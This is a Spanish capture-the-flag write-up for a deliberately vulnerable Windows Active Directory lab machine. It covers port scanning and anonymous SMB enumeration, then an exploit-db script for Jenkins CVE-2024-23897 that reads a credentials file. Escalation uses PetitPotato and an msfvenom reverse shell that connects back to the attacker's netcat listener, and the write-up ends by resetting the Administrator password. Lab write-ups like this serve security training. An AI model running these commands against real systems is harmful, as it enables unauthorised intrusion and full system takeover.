---
layout: post
title: Chimichurri
date: 2024.07.02
categories: [thl, ctf, windows, AD, principiante]
---

![image](/assets/images/chimichurri/chim.jpg)

Estamos ante una máquina Windows, Active Directory, de nivel principiante creada por [CuriosidadesDeHackers](https://www.curiosidadesdehackers.com/) y [condor](https://www.youtube.com/@CondorHacks) de la plataforma [The Hackers Labs](https://thehackerslabs.com/).

Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de nuestra red para averiguar que máquinas hay en ella:

```bash
$ sudo arp-scan -I eth2 --localnet
Interface: eth2, type: EN10MB, MAC: 08:00:27:82:61:c8, IPv4: 192.168.200.100
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   52:54:00:12:35:00       QEMU
192.168.200.2   52:54:00:12:35:00       QEMU
192.168.200.4   08:00:27:0d:f5:f8       PCS Systemtechnik GmbH

```

# Enumeración

Como vemos la máquina tiene asignada la IP **192.168.200.4**.

Empezamos realizando un escaneo de puertos con `nmap`. Hacemos un escaneo silencioso`-sS`, a todos los puertos `-p-`, que nos de detalles del escaneo `-v`, que no haga ping al host `-Pn`, que no haga resolución de DNS `-n` y que nos guarde a un fichero grepeable `-oG` con nombre `ports.txt` a nuestra máquina victima `192.168.200.4`:

```bash
sudo nmap -sS -p- -Pn -n -v 192.168.200.4 -oG ports.txt
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
6969/tcp  open  acmsoda
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49688/tcp open  unknown
```

Como tiene un montón de puertos abiertos obtenemos la lista con el siguiente comando:

```bash
$ cat ports.txt | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ','
53,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49669,49670,49671,49674,49679,49688
```

Ahora hacemos otro escaneo con `nmap`, pero esta vez para ver con mas detalle que hay en esos puertos:

```bash
$ sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49669,49670,49671,49674,49679,49688 -v 192.168.200.4
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-02 05:07:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6969/tcp  open  http          Jetty 10.0.11
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Panel de control [Jenkins]
|_http-server-header: Jetty(10.0.11)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:0D:F5:F8 (Oracle VirtualBox virtual NIC)
Service Info: Host: CHIMICHURRI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| nbstat: NetBIOS name: CHIMICHURRI, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:0d:f5:f8 (Oracle VirtualBox virtual NIC)
| Names:
|   CHIMICHURRI<00>      Flags: <unique><active>
|   CHIMICHURRI0<00>     Flags: <group><active>
|   CHIMICHURRI0<1c>     Flags: <group><active>
|   CHIMICHURRI<20>      Flags: <unique><active>
|_  CHIMICHURRI0<1b>     Flags: <unique><active>
|_clock-skew: -15s
| smb2-time: 
|   date: 2024-07-02T05:07:55
|_  start_date: 2024-07-02T04:58:47
```

Añadimos nombre de dominio a nuestro fichero de hosts:

```bash
$ echo "192.168.200.4 chimichurri.thl" | sudo tee -a /etc/hosts
192.168.200.4 chimichurri.thl
```

Para empezar vamos a mirar si hay algún recurso compartido al que se pueda acceder sin credenciales en el servicio **smb**:

```bash
smbclient --no-pass -L \\192.168.200.4        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        drogas          Disk      
        IPC$            IPC       IPC remota
        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión
```

Encontramos un recurso compartido con el nombre **drogas**, nos conectamos a el para ver que contiene:

```bash
smbclient --no-pass //192.168.200.4/drogas
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jun 27 12:20:49 2024
  ..                                  D        0  Thu Jun 27 12:20:49 2024
  credenciales.txt                    A       95  Sun Jun 30 19:19:03 2024

                7735807 blocks of size 4096. 3942367 blocks available
```

Encontramos un fichero **credenciales.txt**. Lo descargamos a nuestra máquina con el comando `get`:

```bash
smb: \> get credenciales.txt 
getting file \credenciales.txt of size 95 as credenciales.txt (30.9 KiloBytes/sec) (average 30.9 KiloBytes/sec)
smb: \>
```

En nuestro equipo leemos el contenido de dicho fichero:

```bash
$ cat credenciales.txt 
Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico
```

De ese texto presumimos que hay un fichero **perico.txt** en el escritorio del usuario **hacker.**

Ahora pasamos a ver si hay alguna vulnerabilidad en el servicio web. Como hemos visto antes, en el puerto **6969** hay un servicio web. Empezamos buscando información de que tecnología esta usando:

```bash
whatweb -a 3 http://192.168.200.4:6969
http://192.168.200.4:6969 [200 OK] Cookies[JSESSIONID.d01cdd8a], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.11)], HttpOnly[JSESSIONID.d01cdd8a], IP[192.168.200.4], Jenkins[2.361.4], Jetty[10.0.11], OpenSearch[/opensearch.xml], Prototype, Script[text/javascript], Title[Panel de control [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```

Vemos que está usando el framework **Jenkins** versión **2.361.4**. 

# Intrusión

Buscamos en la web del incibe a ver si esa versión de Jenkins tiene alguna vulnerabilidad.  Vemos que hay una vulnerabilidad con CVE CVE-2024-23897 que permite la lectura arbitraria de archivos.

[https://www.incibe.es/incibe-cert/alerta-temprana/avisos/lectura-arbitraria-de-archivos-en-jenkins](https://www.incibe.es/incibe-cert/alerta-temprana/avisos/lectura-arbitraria-de-archivos-en-jenkins)

Buscamos con **searchsploit** a ver si tenemos algún exploit disponible (si no encuentra probar a hacer searchsploit -u para actualizar la BBDD):

```bash
$ searchsploit jenkins CVE-2024-23897 

 Exploit Title               |  Path
----------------------------- ---------------------------------
Jenkins 2.441 - Local File I | java/webapps/51993.py
```

Vemos que hay un exploit disponible, nos lo copiamos a nuestra carpeta de trabajo:

```bash
$ cp /usr/share/exploitdb/exploits/java/webapps/51993.py .
```

Ejecutamos el exploit y le indicamos la url con **-u** y el path del fichero con **-p**. En este caso no es necesario añadirle la unidad (c:):

```bash
$ python 51993.py -u http://192.168.200.4:6969 -p /users/hacker/desktop/perico.txt
hacker:Perico69
```

Nos conectamos con `evil-winrm` y las credenciales recién obtenidas:

```bash
evil-winrm -i 192.168.200.4 -u hacker -p Perico69
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hacker\Documents>
```

Vemos que privilegios tiene el usuario **hacker** en la máquina:

```bash
*Evil-WinRM* PS C:\Users\hacker\Desktop> whoami /priv

INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                  Estado
============================= ============================================ ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci¢n Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
```

# Escalada de privilegios

Como tiene el privilegio **SeImpersonatePrivilege** habilitado procedemos a hacer la escalada usando alguna de las herramientas disponibles, en este caso **PetitPotato**. Nos descargamos el binario de su github:

```bash
wget https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe
```

Para compartir ficheros con la máquina victima creamos un servidor samba en nuestra máquina. Usamos `impacket-smbserver` para crear el server, **-smb2support** para dar soporte a smb2, **kali** es el nombre que le doy al recurso compartido y **.** para compartir lo que tenemos en el directorio actual.

```bash
impacket-smbserver -smb2support kali .               
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Ejecutamos **PetitPotato** para obtener una **cmd**, pero vemos que persiste:

```bash

*Evil-WinRM* PS C:\Users\hacker\desktop> \\192.168.200.100\kali\PetitPotato.exe 3 cmd

[+] Malicious named pipe running on \\.\pipe\petit\pipe\srvsvc.
[+] Invoking EfsRpcQueryUsersOnFile with target path: \\localhost/pipe/petit\C$\wh0nqs.txt.

[+] The connection is successful.
[+] ImpersonateNamedPipeClient OK.
[+] OpenThreadToken OK.
[+] DuplicateTokenEx OK.
[+] CreateProcessAsUser OK.
Microsoft Windows [Versi¢n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>
*Evil-WinRM* PS C:\Users\hacker\desktop>
```

Vamos a intentar crear una shell reversa al ejecutar **PetitPotato**. Para ello, primero creamos un ejecutable con msfvenom para que nos de una shell reversa.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.200.100 LPORT=8889 -f exe -o shell.exe
```

La copiamos en la máquina victima:

```bash
*Evil-WinRM* PS C:\Users\hacker\Documents> copy \\192.168.200.100\kali\shell.exe .
*Evil-WinRM* PS C:\Users\hacker\Documents> dir

    Directorio: C:\Users\hacker\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         7/2/2024  10:25 PM          73802 shell.exe
```

Nos ponemos a la escucha en nuestra máquina atacante y ejecutamos **PetitPotato**:

```bash
*Evil-WinRM* PS C:\Users\hacker\Documents> \\192.168.200.100\kali\PetitPotato.exe 2 .\shell.exe

[+] Malicious named pipe running on \\.\pipe\petit\pipe\srvsvc.
[+] Invoking EfsRpcDecryptFileSrv with target path: \\localhost/pipe/petit\C$\wh0nqs.txt.

[+] The connection is successful.
[+] ImpersonateNamedPipeClient OK.
[+] OpenThreadToken OK.
[+] DuplicateTokenEx OK.
[+] CreateProcessAsUser OK.
```

Obtenemos la shell como **nt authority\system**

```bash
nc -nlvp 8889
listening on [any] 8889 ...
connect to [192.168.200.100] from (UNKNOWN) [192.168.200.4] 62914
Microsoft Windows [Versi?n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

Ahora para obtener el acceso como **Administrador** lo que he hecho es cambiar la contraseña del usuario **Administrador** con `net user`:

```bash
C:\Windows\system32>net user administrador Murrusko0
net user administrador Murrusko0
Se ha completado el comando correctamente.
```

Una vez cambiada nos conectamos usando dichas credenciales:

```bash
$ evil-winrm -i 192.168.200.4 -u administrador -p Murrusko0
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrador\Documents> whoami
chimichurri0\administrador
*Evil-WinRM* PS C:\Users\Administrador\Documents>
```

Y con esto damos por finalizada la máquina.
